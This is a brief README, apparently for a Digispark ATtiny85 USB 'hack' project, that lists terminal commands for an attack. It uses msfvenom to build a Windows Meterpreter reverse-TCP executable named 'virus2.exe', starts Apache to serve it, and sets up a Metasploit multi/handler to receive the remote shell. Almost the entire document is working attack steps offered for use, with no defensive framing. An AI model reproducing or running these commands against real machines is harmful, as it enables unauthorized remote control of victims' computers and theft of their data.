# Digispark-Local-Hack
You can hack with Digispark Attiny85 in 20 Seconds

//////////////////////////

TERMINAL COMMANDS

//////////////////////////

FOR CREATE VIRUS:

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<local ip> lport=<port> -a x64 --platform windows -f exe -o virus2.exe

//////////////////////////

FOR START WEB SERVER:

service apache2 start

//////////////////////////

MSFCONSOLE COMMANDS:

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set LHOST local ip

set LPORT port

exploit
